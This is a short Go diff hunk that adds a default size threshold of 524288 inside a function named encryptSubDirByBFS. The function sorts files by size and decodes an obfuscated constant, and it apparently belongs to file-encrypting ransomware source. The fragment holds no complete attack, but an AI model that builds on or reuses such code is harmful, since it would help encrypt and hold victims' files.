@@ -38,7 +38,7 @@ func encryptSubDirByBFS(dir string) {
 	sort.Sort(dirElementSortBySize(docs))
 	ASMETRI_MAX_INT, err := strconv.Atoi(byte_decode2str(ASMETRI_MAX[:]))
 	if err != nil {
-
+		ASMETRI_MAX_INT = 524288 //默认值
 	}
 
 	for i, doc := range docs {
